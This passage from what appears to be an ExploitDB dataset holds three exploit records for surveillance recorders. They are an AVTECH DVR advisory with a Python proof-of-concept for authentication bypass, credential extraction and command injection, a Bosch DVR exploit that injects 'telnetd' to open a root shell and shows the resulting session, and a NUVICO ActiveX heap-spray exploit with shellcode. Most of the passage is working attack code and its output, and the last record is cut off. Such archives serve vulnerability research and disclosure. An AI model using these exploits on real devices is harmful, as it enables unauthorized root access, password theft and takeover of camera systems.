/cgi-bin/supervisor/adcommand.cgi HTTP/1.1\r\nHost: <device_ip>\r\nContent-Length: 23\r\nCookie: SSID=YWRtaW46YWRtaW4=\r\n\r\nDoShellCmd "strCmd=ps&"\r\n\r\n13) Authenticated command injection in PwdGrp.cgi\r\nThe PwdGrp.cgi uses the username, password and group parameters in a new\r\nuser creation or modification request in a system command without\r\nvalidation or sanitization. Thus and attacker can execute arbitrary\r\nsystem commands with root privileges.\r\nWe are aware that this vulnerability is being exploited in the wild!\r\nPOC:\r\nhttp://<device_ip>/cgi-bin/supervisor/PwdGrp.cgi?action=add&user=test&pwd=;reboot;&grp=SUPERVISOR&lifetime=5%20MIN\r\n\r\n14) HTTPS used without certificate verification\r\nThe SyncCloudAccount.sh, QueryFromClient.sh and SyncPermit.sh scripts\r\nuse wget to access HTTPS sites, such as https://payment.eagleeyes.tw, by\r\nspecifying the no-check-certificate parameter. Thus wget skips server\r\ncertificate verification and a MITM attack is possible against the HTTPS\r\ncommunication.\r\n\r\nTimeline\r\n2015.10.19: First attempt to contact with Avtech, but we did not receive\r\nany response\r\n2016.05.24: Second attempt to contact Avtech without any response\r\n2016.05.27: Third attempt to contact Avtech by sending e-mail to public\r\nAvtech e-mail addresses. We did not receive any response.\r\n2016.xx.xx: Full disclosure\r\n\r\nPOC\r\n---\r\nPOC script is available to demonstrate the following problems [3]:\r\n- Unauthenticated information leakage (capabilities)\r\n- Authentication bypass (.cab, nobody)\r\n- Unauthenticated SSRF on DVR devices\r\n- Unauthenticated command injection on DVR devices\r\n- Login captcha bypass with login=quick or manual cookie creation\r\n- CloudSetup.cgi command injection after authentication\r\n- adcommand.cgi command injection after authentication\r\n\r\nA video demonstration is also available [1], which presents some of the\r\nabove problems.\r\n\r\nRecommendations\r\n---------------\r\nUnfortunately there is no solution available for these vulnerabilities\r\nat the moment. You can take the following steps to protect your device:\r\n- Change the default admin password\r\n- Never expose the web interface of any Avtech device to the internet\r\n\r\nWe note that the above vulnerabilities were found within a short period\r\nof time without a systematic approach. Based on the vulnerability types\r\nwe found and the overall code quality, the devices should contain much\r\nmore problems.\r\n\r\nCredits\r\n-------\r\nThis vulnerability was discovered and researched by Gergely Eberhardt\r\n(@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)\r\n\r\nReferences\r\n----------\r\n[1]\r\nhttps://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities\r\n<http://www.search-lab.hu/advisories/126-avtech-devices-multiple-vulnerabilities>\r\n[2] https://youtu.be/BUx8nLlIMxI\r\n[3] https://github.com/ebux/AVTECH\r\n[4] http://www.search-lab.hu/media/vulnerability_matrix.txt\r\n\'\'\'\r\n\r\n#\r\n# POC code for Technicolor Avtech devices\r\n#\r\n# Demonstrates the following vulnerabilities\r\n#  - Unauthenticated information leakage (capabilities)\r\n#  - Authentication bypass (.cab, nobody)\r\n#  - Unauthenticated SSRF on DVR devices\r\n#  - Unauthenticated command injection on DVR devices\r\n#  - Login captcha bypass with login=quick or manual cookie creation\r\n#  - CloudSetup.cgi command injection after authentication\r\n#  - adcommand.cgi command injection after authentication\r\n#\r\n# Credit: Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)\r\n#\r\n# Advisory: http://search-lab.hu/...\r\n\r\nimport sys\r\nimport requests\r\nimport base64\r\n\r\nclass avtech:\r\n    AVTECH_BYP_NONE = 0\r\n    AVTECH_BYP_CAB = 1\r\n    AVTECH_BYP_NOBODY = 2\r\n\r\n    def __init__(self, addr, port):\r\n        self.addr = addr\r\n        self.port = port\r\n        self.s = requests.Session()\r\n        self.auth = False\r\n        self.authbyp_str = {self.AVTECH_BYP_NONE:\'\', self.AVTECH_BYP_CAB:\'.cab&\', self.AVTECH_BYP_NOBODY:\'/nobody&\'}\r\n        self.authbyp = self.AVTECH_BYP_NONE\r\n        self.username = \'\'\r\n        self.password = \'\'\r\n\r\n        self.cabbyp = False\r\n        self.nobodybyp = False\r\n        self.firmware_version = \'\'\r\n        self.product_type = \'\'\r\n        self.product_id = \'\'\r\n        self.mac_address = \'\'\r\n\r\n    def getUri(self, uri, param, bypass=False):\r\n        if (bypass):\r\n            return \'http://%s:%d/%s?%s%s\'%(self.addr, self.port, uri, self.authbyp_str[self.authbyp], param)\r\n        else:\r\n            return \'http://%s:%d/%s?%s\'%(self.addr, self.port, uri, param)\r\n\r\n    def setPwd(self, usr, pwd):\r\n        self.username = usr\r\n        self.password = pwd\r\n\r\n    # creates a valid cookie without logging in\r\n    def setCookie(self):\r\n        self.s.cookies[\'SSID\'] = base64.b64encode(\'%s:%s\'%(self.username,self.password))\r\n        self.auth = True\r\n\r\n    # performs authentication with the provided user name and password using\r\n    # the login=quick parameter, which bypass the captcha verification\r\n    def login(self):\r\n        self.s = requests.Session()\r\n        r = self.s.get(self.getUri(\'/cgi-bin/nobody/VerifyCode.cgi\', \'account=%s&login=quick\'%(base64.b64encode(\'%s:%s\'%(self.username,self.password)))))\r\n        res = r.text.split()\r\n        if (int(res[0]) == -35):\r\n            #print \'Authentication failed with %s:%s\'%(self.username,self.password)\r\n            return False\r\n        if (int(res[0]) == 0):\r\n            #print \'Authentication succeeded with %s:%s\'%(self.username,self.password)\r\n            self.auth = True\r\n            return True\r\n        #else:\r\n        #    print \'Unknown response code: %d\'%(int(res[0]))\r\n        return False\r\n\r\n    # verifies whether the authentication bypass is working .cab or /nobody problem\r\n    def checkBypass(self):\r\n        if (self.auth):\r\n            return \'Session is already authenticated, you do not have to bypass!\'\r\n        ret = \'\'\r\n        greq = \'&action=get&category=Account.*\'\r\n        # .cab check\r\n        try:\r\n            r = self.s.get(self.getUri(\'/cgi-bin/user/Config.cgi\',\'.cab%s\'%(greq)))\r\n            if (len(r.text) > 0 and r.text[0] == \'0\'):\r\n                ret += \'.cab authentication bypass was successful, \'\r\n                self.authbyp = self.AVTECH_BYP_CAB\r\n                self.cabbyp = True\r\n        except:\r\n            ret += \'.cab authentication bypass was not successful, \'\r\n\r\n        # /nobody check\r\n        try:\r\n            r = self.s.get(self.getUri(\'/cgi-bin/user/Config.cgi\',\'/nobody%s\'%(greq)))\r\n            if (len(r.text) > 0 and r.text[0] == \'0\'):\r\n                ret += \'/nobody authentication bypass was successful\'\r\n                self.nobodybyp = True\r\n                if (self.authbyp == self.AVTECH_BYP_NONE):\r\n                    self.authbyp = self.AVTECH_BYP_NOBODY\r\n        except:\r\n            ret += \'/nobody authentication bypass was not successful\'\r\n        return ret\r\n\r\n    # retrieves account information after authentication\r\n    def getAdminPwd(self):\r\n        r = self.s.get(self.getUri(\'/cgi-bin/user/Config.cgi\',\'action=get&category=Account.*\', True))\r\n        for l in r.text.split():\r\n            lp = l.split(\'=\')\r\n            if (len(lp) == 2):\r\n                if (lp[0] == \'Account.User1.Username\'):\r\n                    self.username = lp[1]\r\n                elif (lp[0] == \'Account.User1.Password\'):\r\n                    self.password = lp[1]\r\n                    break\r\n                if (lp[0] == \'Account.User2.Username\'):\r\n                    self.username = lp[1]\r\n                elif (lp[0] == \'Account.User2.Password\'):\r\n                    self.password = lp[1]\r\n                    break\r\n                if (lp[0] == \'Account.User3.Username\'):\r\n                    self.username = lp[1]\r\n                elif (lp[0] == \'Account.User3.Password\'):\r\n                    self.password = lp[1]\r\n                    break\r\n\r\n    # retrieves firmware version after authentication\r\n    def getFwVersion(self):\r\n        r = self.s.get(self.getUri(\'/cgi-bin/user/Config.cgi\',\'action=get&category=Properties.Firmware.*\', False))\r\n        print r.text\r\n\r\n    # retrieves login response after authentication\r\n    def getLogin(self):\r\n        r = self.s.get(self.getUri(\'/cgi-bin/guest/Login.cgi\',\'rnd=0.5\', False))\r\n        print r.text\r\n\r\n    # CloudSetup.cgi command injection test\r\n    def commandInjection(self, cmd):\r\n        try:\r\n            r = self.s.get(self.getUri(\'/cgi-bin/supervisor/CloudSetup.cgi\',\'exefile=%s\'%(cmd), False))\r\n            return r.text\r\n        except:\r\n            print \'CloudSetup.cgi command injection test failed\'\r\n\r\n    # adcommand.cgi command injection test\r\n    def commandInjection2(self, cmd):\r\n        data = \'DoShellCmd "strCmd=%s&"\'%(cmd)\r\n        r = self.s.post(self.getUri(\'/cgi-bin/supervisor/adcommand.cgi\',\'\', False), data=data)\r\n        return r.text\r\n\r\n    # parses capability response\r\n    def parseCapability(self, cap):\r\n        for l in cap.split(\'\\n\'):\r\n            ld = l.strip().split(\'=\')\r\n            if (len(ld)==2):\r\n                if (ld[0] == \'Firmware.Version\'):\r\n                    self.firmware_version = ld[1]\r\n                elif (ld[0] == \'Product.Type\'):\r\n                    self.product_type = ld[1]\r\n                elif (ld[0] == \'Product.ID\'):\r\n                    self.product_id = ld[1]\r\n                elif (ld[0] == \'MACAddress\'):\r\n                    self.mac_address = ld[1]\r\n\r\n    # unauthenticated information leakage\r\n    def getCapability(self):\r\n        r = self.s.get(self.getUri(\'/cgi-bin/nobody/Machine.cgi\',\'action=get_capability\', False))\r\n        self.parseCapability(r.text)\r\n        return r.text\r\n\r\n    # checks the availability of search.cgi (available only on DVR devices)\r\n    def checkSearch(self):\r\n        try:\r\n            r = self.s.get(self.getUri(\'/cgi-bin/nobody/Search.cgi\',\'action=scan\', False))\r\n            return r.text\r\n        except:\r\n            return \'\'\r\n\r\n    # unauthenticated SSRF using the search.cgi script (available only on DVR devices)\r\n    def checkCgiQuery(self):\r\n        try:\r\n            r = self.s.get(self.getUri(\'/cgi-bin/nobody/Search.cgi\',\'action=cgi_query&ip=google.com&port=80&queryb64str=Lw==\', False))\r\n            if (len(r.text)>=4 and r.text[0:4] == \'0\\nOK\'):\r\n                return True\r\n            else:\r\n                return False\r\n        except:\r\n            return False\r\n\r\n    # unauthenticated command injection in the search.cgi script (available only on DVR devices)\r\n    def searchCmdInjection(self, command):\r\n        cmdstr = (\' ;%s>$(ps|grep Search.cgi|grep -v grep|head -n 1|awk \\\'{print "/tmp/"$1".log"}\\\';)\'%(command)).replace(\' \', \'%20\')\r\n        uri = self.getUri(\'cgi-bin/nobody/Search.cgi\',\'action=cgi_query&ip=google.com&port=80&queryb64str=Lw==&username=admin%s&password=admin\'%(cmdstr),False)\r\n        print uri\r\n        r = self.s.get(uri)\r\n        return r.text\r\n\r\n#------------------------------------\r\n\r\nif __name__ == \'__main__\':\r\n    if (len(sys.argv) < 2):\r\n        print \'avtech_nas_pc.py addr [port]\'\r\n    addr = sys.argv[1]\r\n    port = 80\r\n    if (len(sys.argv) == 3):\r\n        port = int(sys.argv[2])\r\n\r\n    avtech = avtech(addr, port)\r\n\r\n    # unatuhenticated information disclosure\r\n    cap = avtech.getCapability()\r\n    print cap\r\n    avtech.parseCapability(cap)\r\n    print \'%s,%s,%s,%s\'%(avtech.firmware_version, avtech.product_type, avtech.product_id, avtech.mac_address)\r\n\r\n    # check unauthenticated SSRF vulnerability\r\n    sr = avtech.checkSearch()\r\n    if (len(sr) > 0 and sr[0] == \'0\'):\r\n        cgi_query = avtech.checkCgiQuery()\r\n        if (cgi_query):\r\n            print \'SSRF was successful\'\r\n        else:\r\n            print \'SSRF was not successful\'\r\n\r\n        resp = avtech.searchCmdInjection(\'XmlAp r Account.User1.Username\')\r\n        lines = resp.split(\'\\n\')\r\n        if (len(lines) >= 3):\r\n            pwd = lines[2].strip()\r\n            print \'User1 name: %s\'%(pwd)\r\n            avtech.username = pwd\r\n\r\n        resp = avtech.searchCmdInjection(\'XmlAp r Account.User1.Password\')\r\n        lines = resp.split(\'\\n\')\r\n        if (len(lines) >= 3):\r\n            pwd = lines[2].strip()\r\n            print \'User1 password: %s\'%(pwd)\r\n            avtech.password = pwd\r\n\r\n    # authentication bypas\r\n    print \'Authentication bypass check\'\r\n    print avtech.checkBypass()\r\n    print \'Try to get admin password\'\r\n    print avtech.getAdminPwd()\r\n    default = False\r\n    # try default password\r\n    if (avtech.password == \'\'):\r\n        avtech.setPwd(\'admin\', \'admin\')\r\n        default = True\r\n    # login with credentials using captch bypass\r\n    avtech.login()\r\n    # if captch bypass was not possible, but we have a password, set cookie manually\r\n    if (not avtech.auth and not default and avtech.password != \'\'):\r\n        avtech.setCookie()\r\n\r\n    # check issues after authentication\r\n    if (avtech.auth):\r\n        print \'Get admin password\'\r\n        avtech.getAdminPwd()\r\n        print \'Get login\'\r\n        avtech.getLogin()\r\n        print \'Get fw version\'\r\n        avtech.getFwVersion()\r\n        print \'cloud command injection\'\r\n        print avtech.commandInjection(\'ps\')\r\n        print \'adcommand command injection\'\r\n        print avtech.commandInjection2(\'cat /etc/passwd\')', 'description': 'AVTECH IP Camera / NVR / DVR Devices - Multiple Vulnerabilities', 'author': 'Gergely Eberhardt', '_id': 40500, 'source': 'ExploitDB', 'platform': 'cgi', 'date': '2016-10-11T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 80}
{'code': ' :::::::-.   ...    ::::::.    :::.\r\n  ;;,   `\';, ;;     ;;;`;;;;,  `;;;\r\n  `[[     [[[[\'     [[[  [[[[[. \'[[\r\n   $$,    $$$$      $$$  $$$ "Y$c$$\r\n   888_,o8P\'88    .d888  888    Y88\r\n   MMMMP"`   "YmmMMMM""  MMM     YM\r\n \r\n  [ Discovered by dun \\ posdub[at]gmail.com ]\r\n  [ 2014-10-01                              ]\r\n###############################################################################\r\n# [ Bosch Security Systems DVR 630/650/670 Series ] Multiple Vulnerabilities  #\r\n###############################################################################\r\n#\r\n# Device: "The Bosch Video Recorder 630/650 Series is an 8/16\r\n#          channel digital recorder that uses the latest H.264\r\n#          compression technology. With the supplied PC\r\n#          software and built-in web server, the 630/650 Series is\r\n#          a fully integrated, stand-alone video management\r\n#          solution that\'s ready to go, straight out of the box.\r\n#          Available with a variety of storage capacities, the\r\n#          630/650 Series features a highly reliable embedded\r\n#          design that minimizes maintenance and reduces\r\n#          operational costs. The recorder is also available with a\r\n#          built-in DVD writer."\r\n#\r\n# Vendor:    http://www.boschsecurity.com/\r\n# Product:   DVR 630/650  http://resource.boschsecurity.us/documents/Data_sheet_enUS_1977239307.pdf\r\n#            DVR 670      http://resource.boschsecurity.us/documents/DVR_670_Series_Data_sheet_enUS_7654294923.pdf\r\n#\r\n# Software Download:\r\n# http://resource.boschsecurity.us/software/Software_DVR630_650_firmware_v212_all_1980902667.zip\r\n# http://resource.boschsecurity.us/software/Software_DVR670_firmware_v212_enUS_8599929867.zip\r\n# \r\n# Timeline: 2014-10-01 Vulnerability discovered\r\n#           2014-10-03 1 Contact with vendor - No response\r\n#           2014-10-14 Published\r\n#\r\n#\r\n###################################################################\r\n# Gaining Root Shell Access [1]:\r\n\r\nPOST /Net_work.xml HTTP/1.1\r\nAccept: */*\r\nAccept-Language: pl\r\nReferer: http://10.11.219.2/network.html\r\nContent-Type: text/xml; charset=UTF-8\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\r\nHost: 10.11.219.2\r\nContent-Length: 1274\r\nDNT: 1\r\nProxy-Connection: Keep-Alive\r\nPragma: no-cache\r\nCookie: MosaLanguage=0; session=\r\n\r\n<NETWORK_SETTING>\r\n  <DHCP>0</DHCP>\r\n  <DHCPIP>10.11.219.2</DHCPIP>\r\n  <DHCPMASK>255.255.255.0</DHCPMASK>\r\n  <DHCPGW>10.11.219.1</DHCPGW>\r\n  <DHCPDNS1>0.0.0.0</DHCPDNS1>\r\n  <DHCPDNS2>0.0.0.0</DHCPDNS2>\r\n  <IP>10.11.219.2</IP>\r\n  <MASK>255.255.255.0</MASK>\r\n  <GW>10.11.219.1</GW>\r\n  <DNS1>0.0.0.0</DNS1>\r\n  <DNS2>0.0.0.0</DNS2>\r\n  <HTTP_PORT>80</HTTP_PORT>\r\n  <BANDWIDTH>0</BANDWIDTH>\r\n  <DDNS_SERVER>1</DDNS_SERVER>\r\n  <DYNDNS_HOST>wxss</DYNDNS_HOST>\r\n  <DYNDNS_USER>ffl</DYNDNS_USER>\r\n  <DYNDNS_PWD>|telnetd -l${SHELL} -p30 #</DYNDNS_PWD>\r\n  <TZO_HOST></TZO_HOST>\r\n  <TZO_MAIL></TZO_MAIL>\r\n  <TZO_KEY></TZO_KEY>\r\n  <SITE_HOST>sdads</SITE_HOST>\r\n  <SITE_PWD>dsadsd</SITE_PWD>\r\n  <SITE_RECORDID>sdasdas</SITE_RECORDID>\r\n  <SITE_FQDN>dasdas</SITE_FQDN>\r\n  <ALARM_ON>0</ALARM_ON>\r\n  <MOTION>0</MOTION>\r\n  <DISK_FAIL>0</DISK_FAIL>\r\n  <DISK_FULL>0</DISK_FULL>\r\n  <FAN_FAIL>0</FAN_FAIL>\r\n  <DISK_TEMP>0</DISK_TEMP>\r\n  <ADMIN_PW>0</ADMIN_PW>\r\n  <VIDEO_LOSS>0</VIDEO_LOSS>\r\n  <POWER>0</POWER>\r\n  <SENDER>0</SENDER>\r\n  <SMTP></SMTP>\r\n  <SMTP_PORT>25</SMTP_PORT>\r\n  <SSL>0</SSL>\r\n  <USERNAME></USERNAME>\r\n  <PWD></PWD>\r\n  <SENDER_MAIL></SENDER_MAIL>\r\n  <SUBJECT></SUBJECT>\r\n  <MAIL_1></MAIL_1>\r\n  <MAIL_2></MAIL_2>\r\n  <MAIL_3></MAIL_3>\r\n  <MAIL_TEST>0</MAIL_TEST>\r\n</NETWORK_SETTING>\r\n\r\n## PoC:\r\n\r\nroot@debian:~# curl -i -s -k  -X \'POST\'     -H \'Referer: http://10.11.219.2/network.html\' -H \'Content-Type: text/xml; charset=UTF-8\'  \\\r\n  -H \'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\' -H \'DNT: 1\'     \\\r\n  -b \'MosaLanguage=0; session=\'     --data-binary $\'<NETWORK_SETTING>\\x0d\\x0a  <DHCP>0</DHCP>\\x0d\\x0a  <DHCPIP>10.11.219.2</DHCPIP>\\x0d\\x0a  \\\r\n  <DHCPMASK>255.255.255.0</DHCPMASK>\\x0d\\x0a  <DHCPGW>10.11.219.1</DHCPGW>\\x0d\\x0a  <DHCPDNS1>0.0.0.0</DHCPDNS1>\\x0d\\x0a  \\\r\n  <DHCPDNS2>0.0.0.0</DHCPDNS2>\\x0d\\x0a  <IP>10.11.219.2</IP>\\x0d\\x0a  <MASK>255.255.255.0</MASK>\\x0d\\x0a  <GW>10.11.219.1</GW>\\x0d\\x0a  \\\r\n  <DNS1>0.0.0.0</DNS1>\\x0d\\x0a  <DNS2>0.0.0.0</DNS2>\\x0d\\x0a  <HTTP_PORT>80</HTTP_PORT>\\x0d\\x0a  <BANDWIDTH>0</BANDWIDTH>\\x0d\\x0a  \\\r\n  <DDNS_SERVER>1</DDNS_SERVER>\\x0d\\x0a  <DYNDNS_HOST>wxss</DYNDNS_HOST>\\x0d\\x0a  <DYNDNS_USER>ffl</DYNDNS_USER>\\x0d\\x0a  \\\r\n  <DYNDNS_PWD>|telnetd -l${SHELL} -p30 #</DYNDNS_PWD>\\x0d\\x0a  <TZO_HOST></TZO_HOST>\\x0d\\x0a  <TZO_MAIL></TZO_MAIL>\\x0d\\x0a  \\\r\n  <TZO_KEY></TZO_KEY>\\x0d\\x0a  <SITE_HOST>sdads</SITE_HOST>\\x0d\\x0a  <SITE_PWD>dsadsd</SITE_PWD>\\x0d\\x0a  \\\r\n  <SITE_RECORDID>sdasdas</SITE_RECORDID>\\x0d\\x0a  <SITE_FQDN>dasdas</SITE_FQDN>\\x0d\\x0a  <ALARM_ON>0</ALARM_ON>\\x0d\\x0a  \\\r\n  <MOTION>0</MOTION>\\x0d\\x0a  <DISK_FAIL>0</DISK_FAIL>\\x0d\\x0a  <DISK_FULL>0</DISK_FULL>\\x0d\\x0a  <FAN_FAIL>0</FAN_FAIL>\\x0d\\x0a  \\\r\n  <DISK_TEMP>0</DISK_TEMP>\\x0d\\x0a  <ADMIN_PW>0</ADMIN_PW>\\x0d\\x0a  <VIDEO_LOSS>0</VIDEO_LOSS>\\x0d\\x0a  <POWER>0</POWER>\\x0d\\x0a  \\\r\n  <SENDER>0</SENDER>\\x0d\\x0a  <SMTP></SMTP>\\x0d\\x0a  <SMTP_PORT>25</SMTP_PORT>\\x0d\\x0a  <SSL>0</SSL>\\x0d\\x0a  <USERNAME></USERNAME>\\x0d\\x0a  \\\r\n  <PWD></PWD>\\x0d\\x0a  <SENDER_MAIL></SENDER_MAIL>\\x0d\\x0a  <SUBJECT></SUBJECT>\\x0d\\x0a  <MAIL_1></MAIL_1>\\x0d\\x0a  <MAIL_2></MAIL_2>\\x0d\\x0a  \\\r\n  <MAIL_3></MAIL_3>\\x0d\\x0a  <MAIL_TEST>0</MAIL_TEST>\\x0d\\x0a</NETWORK_SETTING>\\x0d\\x0a\'     \'http://10.11.219.2/Net_work.xml\'\r\n\r\nroot@debian:~# telnet 10.11.219.2 30\r\nTrying 10.11.219.2...\r\nConnected to 10.11.219.2.\r\nEscape character is \'^]\'.\r\n\r\nBusyBox v1.1.2 (2009.12.29-03:59+0000) Built-in shell (ash)\r\nEnter \'help\' for a list of built-in commands.\r\n\r\n/ # id\r\nuid=0(root) gid=0(root)\r\n/ # uname -a\r\nLinux everfocus 2.6.24-rt1-hi3520v100 #9 Thu Sep 2 14:00:47 CST 2010 armv6l unknown\r\n/ # ps |grep telnet\r\n 2827 root        228 S   telnetd -l/bin/sh -p30\r\n/ # netstat -ltn | grep 30\r\ntcp        0      0 0.0.0.0:30              0.0.0.0:*               LISTEN\r\n/ # echo pwnd & exit\r\npwnd\r\nConnection closed by foreign host.\r\nroot@debian:~#\r\n\r\n###################################################################\r\n# Gaining Root Shell Access (authorization is needed) [2]:\r\n\r\nGET /ntp.cgi?cmd=ntp_start&time_server=1&private_server=192.168.0.245|%20telnetd%20-l${SHELL}%20-p40;%20id&rnd=4392 HTTP/1.1\r\nAccept: */*\r\nAccept-Language: pl\r\nReferer: http://10.11.219.2/system.html\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\r\nHost: 10.11.219.2\r\nDNT: 1\r\nProxy-Connection: Keep-Alive\r\nCookie: MosaLanguage=0; session=\r\n\r\n## PoC:\r\n\r\nroot@debian:~# curl -i -s -k  -X \'GET\'     \\\r\n  -H \'Referer: http://10.11.219.2/system.html\' \\\r\n  -H \'User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\' -H \'DNT: 1\'     \\\r\n  -b \'MosaLanguage=0; session=\'     \'http://10.11.219.2/ntp.cgi?cmd=ntp_start&time_server=1&private_server=192.168.0.245|%20telnetd%20-l${SHELL}%20-p40;%20id\'\r\n\r\n\r\nroot@debian:~# telnet 10.11.219.2 40\r\nTrying 10.11.219.2...\r\nConnected to 10.11.219.2.\r\nEscape character is \'^]\'.\r\n\r\nBusyBox v1.1.2 (2009.12.29-03:59+0000) Built-in shell (ash)\r\nEnter \'help\' for a list of built-in commands.\r\n\r\n/ # id\r\nuid=0(root) gid=0(root)\r\n/ # uname -a\r\nLinux everfocus 2.6.24-rt1-hi3520v100 #9 Thu Sep 2 14:00:47 CST 2010 armv6l unknown\r\n/ # ps |grep telnet\r\n 2827 root        228 S   telnetd -l/bin/sh -p40\r\n/ # netstat -ltn | grep 40\r\ntcp        0      0 0.0.0.0:40              0.0.0.0:*               LISTEN\r\n/ # echo pwnd & exit\r\npwnd\r\nConnection closed by foreign host.\r\nroot@debian:~#\r\n\r\n###################################################################\r\n# Admin Password Disclosure: http://10.11.219.2/User.cgi?cmd=get_user\r\n\r\n## PoC Exploit:\r\n\r\n#!/bin/bash\r\nx=0;\r\nfor i in $(curl --silent http://10.11.219.2/User.cgi?cmd=get_user| sed \'s/<[^>]\\+>/ /g\' | sed -r \'s/(\\s)+[0-9]//g\');\r\ndo base64 -d<<<$i; if [ $(( $x % 2 )) -eq 0 ]; then echo -n ":"; else echo ; fi; ((x++)); done\r\n\r\n###################################################################\r\n# Sensitive Information Disclosure:\r\n\r\nhttp://10.11.219.2/Config.cgi?cmd=system_info\r\nhttp://10.11.219.2/System.xml\r\nhttp://10.11.219.2/Net_work.xml\r\n\r\nhttp://10.11.219.2/webcmd.html\r\n\r\n/ # cat /4mosa600/data/Webcmd_help.txt\r\n\r\n   cmd                     value (sample)\r\n====================+==========================\r\n blockid            |       0 ~ block max     // show block info and flag and gop status.\r\n--------------------+-------------------------\r\n disk               |                         // show disk temp.\r\n--------------------+-------------------------\r\n reboot             |                         // restart DVR.\r\n--------------------+-------------------------\r\n remote-info        |                         // socket status.\r\n--------------------+-------------------------\r\n log                |      1:   System        // show system log.\r\n                    |      2:   Record\r\n                    |      4:   Login\r\n                    |      8:   Configure\r\n                    |      16:  Operation\r\n                    |      31:  All\r\n                    |      63:  Service\r\n--------------------+-------------------------\r\n ionly              |      1~12 how many frames in a GOP will send to internet\r\n                    |      0:   all I/P-frame (default)\r\n                    |      1:   I only\r\n                    |      2:   IP\r\n                    |      3:   IPP\r\n                    |      4:   IPPP\r\n                    |      ....\r\n                    |      12:  IPPPPPPPPPPP\r\n                    |      others: show current value on DVR.\r\n--------------------+-------------------------\r\n chlink             |      0~MKF_CHANNEL      // show channel link.\r\n--------------------+-------------------------\r\n bitrate            |                         // show bitrate information.\r\n--------------------+-------------------------\r\n dls                |                         // show about time and DLS message.\r\n--------------------+-------------------------\r\n bmp                |                         // dump bmp file to http://x.x.x.x/vga0.bmp\r\n--------------------+-------------------------\r\n msg                |      This is bitmap\r\n                    |      bit 0 show encode FPS and Bitrate.             \r\n                    |      bit 1 show encode resolution.(dependent bit 1)             \r\n                    |      bit 2 show remote client mesage.\r\n                    |      bit 3 show ptz command.\r\n                    |      bit 4 cpu and memory usage..\r\n--------------------+-------------------------\r\n remote-cgi         |      0     disable all cgi command.\r\n                    |      1     show all cgi command to console.\r\n                    |      2     show cig command if not "login_id"\r\n--------------------+-------------------------', 'description': 'Bosch Security Systems DVR 630/650/670 Series - Multiple Vulnerabilities', 'author': 'dun', '_id': 34956, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2014-10-14T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 0}
{'code': '<!--\r\nNUVICO DVR NVDV4 / PdvrAtl Module (PdvrAtl.DLL 1.0.1.25) remote heap\r\noverflow exploit (IE7/XP SP2)\r\n\r\ncheck a camera demo here: http://www.2mcctv.com/2mdemo.php\r\ncodebase: http://www.dvrstation.com/pdvratl.php?vendor=0\r\n\r\nrgod /////////////////////////////// http://retrogod.altervista.org\r\n-->\r\n<html>\r\n<script language="javascript">\r\n//add su one, user: sun pass: tzu\r\nshellcode = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u3749%u4949%u4949%u4949%u4949%u4949%u4949%u4949%u5a51%u456a%u5058%u4230%u4231%u6b41%u4141%u3255%u4241%u3241%u4142%u4230%u5841%u3850%u4241%u6d75%u6b39%u494c%u5078%u3344%u6530%u7550%u4e50%u716b%u6555%u6c6c%u614b%u676c%u3175%u6568%u5a51%u4e4f%u306b%u564f%u4c78%u414b%u774f%u4450%u4841%u576b%u4c39%u664b%u4c54%u444b%u7841%u466e%u6951%u4f50%u6c69%u6b6c%u6f34%u3330%u6344%u6f37%u6a31%u646a%u474d%u4871%u7842%u4c6b%u6534%u716b%u5144%u6334%u7434%u5835%u6e65%u736b%u646f%u7364%u5831%u756b%u4c36%u644b%u624c%u6c6b%u634b%u656f%u574c%u7871%u4c6b%u774b%u4c6c%u464b%u7861%u4f6b%u7379%u516c%u3334%u6b34%u7073%u4931%u7550%u4e34%u536b%u3470%u4b70%u4f35%u7030%u4478%u4c4c%u414b%u5450%u4c4c%u624b%u6550%u6c4c%u6e6d%u626b%u6548%u6858%u336b%u6c39%u4f4b%u4e70%u5350%u3530%u4350%u6c30%u704b%u3568%u636c%u366f%u4b51%u5146%u7170%u4d46%u5a59%u6c58%u5943%u6350%u364b%u4230%u7848%u686f%u694e%u3170%u3370%u4d58%u6b48%u6e4e%u346a%u464e%u3937%u396f%u7377%u7053%u426d%u6444%u756e%u5235%u3058%u6165%u4630%u654f%u3133%u7030%u706e%u3265%u7554%u7170%u7265%u5353%u7055%u5172%u5030%u4273%u3055%u616e%u4330%u7244%u515a%u5165%u5430%u526f%u5161%u3354%u3574%u7170%u5736%u4756%u7050%u306e%u7465%u4134%u7030%u706c%u316f%u7273%u6241%u614c%u4377%u6242%u524f%u3055%u6770%u3350%u7071%u3064%u516d%u4279%u324e%u7049%u5373%u5244%u4152%u3371%u3044%u536f%u4242%u6153%u5230%u4453%u5035%u756e%u3470%u506f%u6741%u7734%u4734%u4570");\r\nbigblock  = unescape("%u9090%u9090");\r\nheadersize = 20;\r\nslackspace = headersize+shellcode.length;\r\nwhile (bigblock.length<slackspace) bigblock+=bigblock;\r\nfillblock = bigblock.substring(0, slackspace);\r\nblock = bigblock.substring(0, bigblock.length-slackspace);\r\nwhile(block.length+slackspace<0x40000) block = block+block+fillblock;\r\nmemory = new Array();\r\nfor (i=0;i<500;i++){memory[i] = block+shellcode}\r\nvar suntzu = new ActiveXObject("PdvrAtl.PdvrOcx.1");//D64CF6D4-45DF-4D8F-9F14-E65FADF2777C\r\nwszFormat="";\r\nfor (i=0;i<=1666;i++){wszFormat=wszFormat + unescape("%0d")}\r\nnTime=1;\r\nsuntzu.TimeSpanFormat(nTime ,wszFormat);\r\n</script>\r\n</html>\r\n\r\n# milw0rm.com [2008-01-13]', 'description': "NUVICO DVR NVDV4 / PdvrAtl Module 'PdvrAtl.DLL 1.0.1.25' - Remote Buffer Overflow", 'author': 'rgod', '_id': 4903, 'source': 'ExploitDB', 'platform': 'windows', 'date': 